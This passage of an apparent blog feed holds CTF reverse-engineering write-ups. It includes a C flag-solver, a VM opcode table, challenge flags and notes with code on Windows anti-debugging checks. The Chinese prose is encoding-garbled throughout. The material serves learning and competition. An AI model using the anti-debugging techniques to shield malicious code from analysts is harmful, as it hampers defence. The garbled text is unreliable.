src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114230655880-1605451277741.png" alt="image-20201114230655880"></p><p>æ¥ä¸‹æ¥åˆ¤æ–­æˆ‘ä»¬è¾“å…¥æœ€åä¸€ä½æ˜¯ä¸æ˜¯ â€˜}â€˜ å­—ç¬¦ï¼Œå†æŠŠé™¤äº†flag{ }ä¸­çš„å†…å®¹å¤åˆ¶åˆ°ä¸ç¨‹åºæœ€ååšæ¯”è¾ƒçš„å­—ç¬¦ä¸²çš„ä¸‹é¢ï¼Œ</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114230109551-1605451277741.png" alt="image-20201114230109551"></p><p>æ¥ç€åˆ¤æ–­æˆ‘ä»¬å¼€å§‹çš„5ä½æ˜¯ä¸æ˜¯ flag{ã€‚</p><p>æœ€åå°±æ˜¯ä»¥æ­¤å–å‡ºæˆ‘ä»¬flag{}ä¸­æ¯ä¸€ä½ï¼Œ<code>(0xFB*input[i])&amp;0xff</code>ï¼Œç„¶åä»¥æ­¤ä¸ä¸Šé¢çš„æ¯”è¾ƒå­—ç¬¦ä¸²æ¯”è¾ƒã€‚è§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[] = &#123;<span class="number">237</span>, <span class="number">6</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">252</span>, <span class="number">227</span>, <span class="number">232</span>, <span class="number">6</span>, <span class="number">237</span>, <span class="number">11</span>, <span class="number">247</span>, <span class="number">247</span>, <span class="number">22</span>, <span class="number">6</span>, <span class="number">237</span>, <span class="number">27</span>, <span class="number">12</span>, <span class="number">252</span>, <span class="number">232</span>, <span class="number">12</span>, <span class="number">242</span>, <span class="number">22</span>, <span class="number">247</span>, <span class="number">2</span>, <span class="number">242</span>, <span class="number">17</span>, <span class="number">227</span>, <span class="number">227</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">247</span>, <span class="number">252</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flag&#123;"</span>);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">32</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((i*<span class="number">0xFB</span>)&amp;<span class="number">0xff</span>) == a[j])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;72c149827155b27ad48d6b5f6c99fd54&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2ä¸ªè™šæ‹Ÿæœºç±»å‹çš„é¢˜ç›®ã€‚å¾ˆé«˜å…´è¿›äº†çº¿ä¸‹ï¼Œé˜Ÿä¼æœ€åç¬¬2å/ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>ç¬¬ä¹å±Šå…¨å›½ç”µä¿¡å’Œäº’è”ç½‘è¡Œä¸šç½‘ç»œå®‰å…¨ç®¡ç†æŠ€èƒ½ç«èµ›</title>
    <link href="https://www.bxnop.cn/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/"/>
    <id>https://www.bxnop.cn/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/</id>
    <published>2020-11-07T08:34:10.000Z</published>
    <updated>2021-01-26T08:15:47.982Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨æœ€å10åˆ†é’Ÿæ‹¿åˆ°è¿™ä¸ªé¢˜çš„äºŒè¡€ï¼Œæ„Ÿè§‰è¿˜ä¸é”™ã€‚<a id="more"></a></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h3><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/image-20201106230503034.png" alt="image-20201106230503034"></p><p>ä»æ–‡ä»¶åå­—åŠç¨‹åºä¸­çš„å­—ç¬¦ä¸²ï¼š<strong>runtime~</strong>å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ªgoè¯­è¨€å†™çš„ç¨‹åºï¼Œç„¶åä½¿ç”¨IDAGolangHelperè„šæœ¬è¿˜åŸç¨‹åºçš„ç¬¦å·è¡¨ã€‚è¿™ä¸‹ä»å‡½æ•°åç§°å¯ä»¥æå¤§çš„å‡å°‘å·¥ä½œé‡ã€‚</p><p>æ‰¾åˆ°mainå‡½æ•°ï¼Œç®€å•åˆ†æä¸€ä¸‹å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºç±»å‹çš„é¢˜ç›®ï¼š</p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/image-20201106210626460-1604738087809.png" alt="image-20201106210626460"></p><p>æå–å‡ºopcodeè¡¨ï¼š</p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/2.png" alt="image-20201106210922720"></p><p>çŸ¥é“äº†æ“ä½œç çš„åŠŸèƒ½ï¼Œä»7çš„æ•°æ®ä¸ªæ•°å¯ä»¥çŸ¥é“æˆ‘ä»¬è¦è¾“å…¥çš„å­—ç¬¦é•¿åº¦æ˜¯24ï¼Œ<strong>5 ~</strong>å…¶å®å°±æ˜¯ä¸€ä¸ªå–ä¸‹ä¸ªæ•°æ®å€¼ã€‚ç„¶åå¯¹äºcode = 4,ï¼Œ1*1çš„æ“ä½œè™½ç„¶å€¼æ²¡æ”¹å˜ä½†å…¶å®åœ¨æ”¹å˜å–æ•°æ®indexã€‚è€Œå¯¹äºæ“ä½œç 5 1 4ç®—æ˜¯å¤šä½™çš„ç±»ä¼¼èŠ±æŒ‡ä»¤å§ã€‚å¦‚æœå¯¹è¿™ä¸ªååˆ†ç†Ÿæ‚‰ä¹‹åå¯ä»¥ç›´æ¥æ ¹æ®opcodeå’Œå¯†æ–‡é€†å‘flagçš„ï¼Œä½†æˆ‘è¿˜æ˜¯è°ƒè¯•å•æ­¥è°ƒè¯•æ¥åšçš„ï¼š</p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/3.png" alt="image-20201106212942973"></p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/4.png" alt="image-20201106212508124"></p><p>æ•´ç†äº†å‰é¢å‡ ä¸ªå­—ç¬¦çš„ç¬”è®°ï¼šåé¢è¿˜æœ‰å¯¹æ•°æ®ä¹˜æ³•åŠ æ³•çš„æ“ä½œï¼Œç›´æ¥è°ƒè¯•ç€èµ°å°±æ˜¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input[<span class="number">0</span>],input[<span class="number">1</span>] = -input[<span class="number">1</span>], input[<span class="number">2</span>] = -input[<span class="number">2</span>], input[<span class="number">3</span>]*input[<span class="number">4</span>]*input[<span class="number">5</span>],</span><br><span class="line">f,l,a,g,&#123;I</span><br><span class="line">ä»å¼€å§‹çš„å‡ ä¸ªå­—ç¬¦æ“ä½œè°ƒè¯•å¾—å‡ºç»“æœflag&#123;,åˆä»input[<span class="number">3</span>]*input[<span class="number">4</span>]*input[<span class="number">5</span>] == E1CA5h, ç®—å‡ºinput[<span class="number">5</span>] = <span class="string">'I'</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªå°æŠ€å·§ï¼šè°ƒè¯•æ—¶æ¯æ¬¡è¾“å…¥ä¸€ä¸ªé€’å¢çš„æ•°æ®ï¼Œè¿™æ ·è¿˜åœ¨è°ƒè¯•çš„dumpçª—å£çœ‹æˆ‘ä»¬çš„æ•°æ®æœ‰æ²¡æœ‰å˜åŒ–ã€‚</p><p>æœ€åè°ƒè¯•å®Œä¸€éå¾—åˆ°flagï¼š<strong>flag{I_am_the_last_one}</strong></p><p>èµ›åæˆ‘ä¹Ÿç›´æ¥æ ¹æ®æ“ä½œç èµ°äº†ä¸€éç¨‹åºçš„æµç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">5</span>, <span class="number">1635</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">9</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">2</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>,</span><br><span class="line"> <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2222</span>, <span class="number">8</span>, <span class="number">0</span>]</span><br><span class="line"><span class="comment">//7:input, 2:-, 3:+, 4:*</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åœ¨æœ€å10åˆ†é’Ÿæ‹¿åˆ°è¿™ä¸ªé¢˜çš„äºŒè¡€ï¼Œæ„Ÿè§‰è¿˜ä¸é”™ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>åè°ƒè¯•è®°å½•</title>
    <link href="https://www.bxnop.cn/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.bxnop.cn/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/</id>
    <published>2020-11-05T08:50:08.000Z</published>
    <updated>2020-12-13T09:29:52.271Z</updated>
    
    <content type="html"><![CDATA[<p>ä»Šåé‡åˆ°çš„åè°ƒè¯•éƒ½è®°å½•åœ¨æ­¤ï¼Œæœ‰äº›å…·ä½“å†…éƒ¨åŸç†åé¢å†æ¥è¡¥ã€‚<a id="more"></a></p><h3 id="NtQueryInformationProcesså‡½æ•°"><a href="#NtQueryInformationProcesså‡½æ•°" class="headerlink" title="NtQueryInformationProcesså‡½æ•°"></a>NtQueryInformationProcesså‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(WINAPI *NtQueryInformationProcessPtr)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       HANDLE processHandle,<span class="comment">//è¿›ç¨‹å¥æŸ„</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       PROCESSINFOCLASS processInformationClass,<span class="comment">//ä¿¡æ¯ç±»å‹</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       PVOID processInformation,<span class="comment">//ç¼“å†²åŒºï¼Œå‡½æ•°è¿”å›å€¼å­˜å…¥çš„åœ°å€ç©ºé—´ã€‚</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       ULONG processInformationLength,<span class="comment">//ç¼“å†²åŒºçš„å¤§å°</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       PULONG returnLength)</span></span>;</span><br><span class="line"><span class="comment">//å½“ç¬¬äºŒä¸ªå‚æ•°ä¸º7æ—¶å¯ä»¥ç”¨æ¥æŸ¥çœ‹è¿›ç¨‹çš„è°ƒè¯•ç«¯å£ã€‚å½“è¿›ç¨‹è¢«è°ƒè¯•æ—¶è¿”å›-1ï¼Œå¦åˆ™è¿”å›å…¶å®ƒå€¼ã€‚</span></span><br></pre></td></tr></table></figure><p>å¦å¤–ç”±äºè¿™æ˜¯ä¸€ä¸ªæœªå…¬å¼€çš„APIï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨LoadLibraryå’ŒGetProceAddressçš„æ–¹æ³•è·å–è°ƒç”¨åœ°å€ã€‚è¿™é‡Œè´´ä¸Šé‡åˆ°çš„ç¨‹åºä¸­ä½¿ç”¨è¿™ä¸ªå‡½æ•°æ¥æ£€æµ‹è°ƒè¯•çš„å®ä¾‹ï¼š</p><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201105170711386.png" alt="image-20201105170711386"></p><p>æ‰€ä»¥æ‰§è¡Œå®Œè¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥æ ¹æ®dword_404468çš„å€¼åˆ¤æ–­è¿›ç¨‹æ˜¯å¦å¤„äºè°ƒè¯•ã€‚</p><h3 id="NtSetInformationThreadå‡½æ•°"><a href="#NtSetInformationThreadå‡½æ•°" class="headerlink" title="NtSetInformationThreadå‡½æ•°"></a>NtSetInformationThreadå‡½æ•°</h3><p>ä¸ä¸Šé¢ä¸€ä¸ªå‡½æ•°ç±»ä¼¼çš„ç”¨æ³•ï¼Œä¹Ÿéœ€è¦ä½¿ç”¨LoadLibraryå’ŒGetProceAddressçš„æ–¹æ³•è·å–è°ƒç”¨åœ°å€ã€‚</p><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201105171431630.png" alt="image-20201105171431630"></p><p>è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ï¼Œå¦‚æœåœ¨ç¬¬äºŒä¸ªå‚æ•°é‡ŒæŒ‡å®š0x11è¿™ä¸ªå€¼ï¼ˆæ„æ€æ˜¯ThreadHideFromDebuggerï¼‰ï¼Œç­‰äºå‘Šè¯‰æ“ä½œç³»ç»Ÿï¼Œå°†æ‰€æœ‰é™„åŠ çš„è°ƒè¯•å™¨ç»Ÿç»Ÿå–æ¶ˆæ‰ï¼Œå³é€€å‡ºè°ƒè¯•çŠ¶æ€ã€‚</p><h3 id="IsProcessorFeaturePresentå‡½æ•°"><a href="#IsProcessorFeaturePresentå‡½æ•°" class="headerlink" title="IsProcessorFeaturePresentå‡½æ•°"></a>IsProcessorFeaturePresentå‡½æ•°</h3><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201105172140986.png" alt="image-20201105172140986"></p><h3 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a>CheckRemoteDebuggerPresent</h3><p>CheckRemoteDebuggerPresentå®é™…ä¸Šè°ƒç”¨äº†ntdllé‡Œé¢çš„ZwQueryInformationProcessæ¥æ£€æµ‹ï¼Œå’Œä¸Šé¢è®°å½•çš„ç¬¬ä¸€ä¸ªå‡½æ•°ä¸€æ ·ï¼Œå…¶ç¬¬äºŒä¸ªå‚æ•°æ˜¯7ï¼Œè¢«å®šä¹‰ä¸ºProcessDebugPortã€‚</p><p>å®ƒä¸ä»…å¯ä»¥æ¢æµ‹ç³»ç»Ÿå…¶ä»–è¿›ç¨‹æ˜¯å¦è¢«è°ƒè¯•ï¼Œé€šè¿‡ä¼ é€’è‡ªèº«è¿›ç¨‹å¥æŸ„è¿˜å¯ä»¥æ¢æµ‹è‡ªèº«æ˜¯å¦è¢«è°ƒè¯•ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CheckDebug</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    BOOL ret;  </span><br><span class="line">    CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);  </span><br><span class="line">    <span class="keyword">return</span> ret;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¦‚æœæœ‰è°ƒè¯•å™¨å­˜åœ¨åˆ™retçš„å€¼ä¸ºé0</span></span><br></pre></td></tr></table></figure><h3 id="æ—¶é’Ÿæ£€æµ‹ï¼ˆrdtscï¼‰"><a href="#æ—¶é’Ÿæ£€æµ‹ï¼ˆrdtscï¼‰" class="headerlink" title="æ—¶é’Ÿæ£€æµ‹ï¼ˆrdtscï¼‰"></a>æ—¶é’Ÿæ£€æµ‹ï¼ˆrdtscï¼‰</h3><p>è¿™ä¸ªåè°ƒè¯•ä¸»è¦å°±æ˜¯æ£€æŸ¥2ä¸ªæŒ‡ä»¤æ‰§è¡Œä¹‹é—´ç›¸å·®çš„æ—¶é—´ï¼Œå¦‚æœæˆ‘ä»¬è°ƒè¯•å•æ­¥æ‰§è¡Œçš„æ—¶é—´è‚¯å®šæ˜¯å¤§äºæ­£å¸¸æ—¶é—´çš„ã€‚</p><p>å¯¹æŠ—è¿™ç§åè°ƒè¯•ï¼Œå¯ä»¥æ‰“patchï¼Œä¹Ÿå¯ä»¥æŠŠæ–­ç‚¹ä¸‹åœ¨å®ƒåé¢ï¼Œå…·ä½“è¿˜æ˜¯æƒ…å†µè€Œå®šã€‚</p><p>ä¸€ä¸ªå®ä¾‹ï¼Œé€šè¿‡åœ¨å®ƒåé¢ä¸‹æ–­å¯¹æŠ—ã€‚</p><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201213172904993.png" alt="image-20201213172904993"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»Šåé‡åˆ°çš„åè°ƒè¯•éƒ½è®°å½•åœ¨æ­¤ï¼Œæœ‰äº›å…·ä½“å†…éƒ¨åŸç†åé¢å†æ¥è¡¥ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>2020æ¹–æ¹˜æ¯</title>
    <link href="https://www.bxnop.cn/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/"/>
    <id>https://www.bxnop.cn/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/</id>
    <published>2020-11-02T00:37:57.000Z</published>
    <updated>2020-11-05T08:45:51.083Z</updated>
    
